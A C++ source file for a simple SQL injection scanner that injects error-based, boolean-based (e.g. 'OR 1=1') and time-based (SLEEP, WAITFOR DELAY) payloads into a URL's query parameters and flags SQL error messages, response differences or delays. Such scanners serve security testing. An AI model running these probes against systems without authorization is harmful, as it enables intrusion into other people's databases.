#include "sqlinj.h"

#include <iostream>
#include <vector>
#include <string>
#include <chrono>
#include <boost/url.hpp>
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>
#include <regex>

namespace beast = boost::beast;
namespace http = beast::http;
namespace net = boost::asio;
namespace urls = boost::urls;
using tcp = net::ip::tcp;
namespace ssl = net::ssl;

// Отправка HTTP/HTTPS GET запроса
std::string sendRequest(const std::string& host, const std::string& target,
                        const std::string& port, bool useSSL, double& duration) {
    try {
        net::io_context ioc;
        ssl::context ctx(ssl::context::sslv23_client);
        tcp::resolver resolver(ioc);

        auto const results = resolver.resolve(host, port);
        beast::flat_buffer buffer;
        std::string body;

        auto start = std::chrono::high_resolution_clock::now();

        if (useSSL) {
            beast::ssl_stream<beast::tcp_stream> stream(ioc, ctx);
            if(!SSL_set_tlsext_host_name(stream.native_handle(), host.c_str())) {
                throw beast::system_error(
                    beast::error_code(static_cast<int>(::ERR_get_error()), net::error::get_ssl_category()));
            }
            beast::get_lowest_layer(stream).connect(results);
            stream.handshake(ssl::stream_base::client);

            http::request<http::string_body> req{http::verb::get, target, 11};
            req.set(http::field::host, host);
            req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);
            http::write(stream, req);

            http::response<http::string_body> res;
            http::read(stream, buffer, res);
            body = res.body();
        } else {
            beast::tcp_stream stream(ioc);
            stream.connect(results);

            http::request<http::string_body> req{http::verb::get, target, 11};
            req.set(http::field::host, host);
            req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);
            http::write(stream, req);

            http::response<http::string_body> res;
            http::read(stream, buffer, res);
            body = res.body();
        }

        auto end = std::chrono::high_resolution_clock::now();
        duration = std::chrono::duration<double>(end - start).count();
        return body;
    }
    catch (std::exception& e) {
        std::cerr << "[!] Request error: " << e.what() << std::endl;
        return "";
    }
}

bool containsSQLError(const std::string& response) {
    static std::vector<std::string> errorPatterns = {
        "SQL syntax", "mysql_fetch", "ORA-01756", "SQLSTATE", "ODBC", "Warning.*mysql_",
        "Unclosed quotation mark", "quoted string not properly terminated"
    };
    for(const auto& pattern : errorPatterns) {
        if(std::regex_search(response, std::regex(pattern, std::regex::icase))) {
            return true;
        }
    }
    return false;
}

void scan_sqli(const std::string& urlStr) {
    std::cout << "[*] Scanning: " << urlStr << std::endl;

    urls::url_view urlView(urlStr);
    std::string scheme = std::string(urlView.scheme());
    bool useSSL = (scheme == "https");
    std::string host = std::string(urlView.host());
    std::string port = urlView.port().empty() ? (useSSL ? "443" : "80") : std::string(urlView.port());
    std::string path = urlView.encoded_path();
    if(path.empty()) path = "/";

    auto params = urlView.params();
    std::vector<std::string> paramKeys;
    for (const auto& p : params) {
        paramKeys.push_back(std::string(p.key));
    }

    std::vector<std::string> error_payloads = {
        "'", "\"", "`", "';", "\";"
    };

    std::vector<std::pair<std::string, std::string>> boolean_payloads = {
        {"1", "1 AND 1=2"},
        {"1", "1 OR 1=1"},
        {"test", "test' OR '1'='1"},
    };

    std::vector<std::string> time_payloads = {
        "1 OR SLEEP(5)",
        "1; WAITFOR DELAY '0:0:5'"
    };


    urls::params_view origParams = urlView.params();
    std::string originalTarget = path + "?" + origParams.encoded_query();
    double origTime = 0;
    std::string originalResponse = sendRequest(host, originalTarget, port, useSSL, origTime);

    for(const auto& key : paramKeys) {
        // Error-based payloads
        for(const auto& payload : error_payloads) {
            urls::url modifiedUrl(urlView);
            modifiedUrl.params().erase(key);
            modifiedUrl.params().append(key, payload);

            std::string target = modifiedUrl.encoded_path() + "?" + modifiedUrl.encoded_query();
            double duration = 0;
            std::string response = sendRequest(host, target, port, useSSL, duration);

            if(containsSQLError(response)) {
                std::cout << "[+] Possible Error-based SQLi in parameter '" << key
                          << "' with payload '" << payload << "'\n";
            }
        }

        // Boolean-based payloads
        for(const auto& bp : boolean_payloads) {
            urls::url modTrue(urlView), modFalse(urlView);
            modTrue.params().erase(key);
            modFalse.params().erase(key);
            modTrue.params().append(key, bp.first);
            modFalse.params().append(key, bp.second);

            double timeTrue = 0, timeFalse = 0;
            std::string respTrue = sendRequest(host, modTrue.encoded_path() + "?" + modTrue.encoded_query(), port, useSSL, timeTrue);
            std::string respFalse = sendRequest(host, modFalse.encoded_path() + "?" + modFalse.encoded_query(), port, useSSL, timeFalse);

            if(respTrue.size() != respFalse.size()) {
                std::cout << "[+] Possible Boolean-based SQLi in '" << key << "'\n";
            }
        }

        // Time-based payloads
        for(const auto& payload : time_payloads) {
            urls::url modifiedUrl(urlView);
            modifiedUrl.params().erase(key);
            modifiedUrl.params().append(key, payload);

            double duration = 0;
            sendRequest(host, modifiedUrl.encoded_path() + "?" + modifiedUrl.encoded_query(), port, useSSL, duration);

            if(duration - origTime >= 4.0) { // если задержка более 4 сек
                std::cout << "[+] Possible Time-based SQLi in '" << key
                          << "' with payload '" << payload << "' (delay: " << duration << " sec)\n";
            }
        }
    }
}